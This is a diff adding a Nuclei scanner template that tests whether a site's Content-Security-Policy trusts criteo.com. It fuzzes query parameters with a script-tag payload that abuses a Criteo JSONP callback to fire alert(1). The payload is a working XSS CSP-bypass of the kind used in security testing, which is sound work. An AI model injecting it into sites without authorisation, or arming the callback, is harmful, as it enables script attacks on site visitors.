@@ -1,0 +1,55 @@
+id: criteo-cas-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Criteo CAS
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,criteo-cas
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "criteo.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: criteo_cas_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "criteo_cas_csp_xss == true"
+# digest: 4a0a0047304502210089e69d58253c2bc7f95cca3dd0db9fe02ad24fce3e4a4403b2010353eeae4b1e02203cc9e58a0ddbb6c17f5445ef597574fe327ea4c02543e2d9e26234d58dc6440a:922c64590222798bb761d5b6d8e72950
